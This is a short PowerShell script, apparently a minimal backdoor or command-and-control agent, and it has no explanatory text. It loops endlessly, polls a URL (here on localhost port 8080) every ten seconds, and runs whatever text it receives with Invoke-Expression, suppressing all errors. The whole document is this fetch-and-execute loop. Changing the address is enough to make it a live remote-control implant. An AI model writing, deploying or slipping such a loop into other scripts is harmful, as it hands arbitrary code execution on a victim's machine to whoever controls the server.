while ($true) {
    try {
        $cmd = Invoke-RestMethod -Uri "http://localhost:8080/getcommand.txt"
        if ($cmd -ne "") {
            iex $cmd
        }
    } catch {}
    Start-Sleep -Seconds 10
}
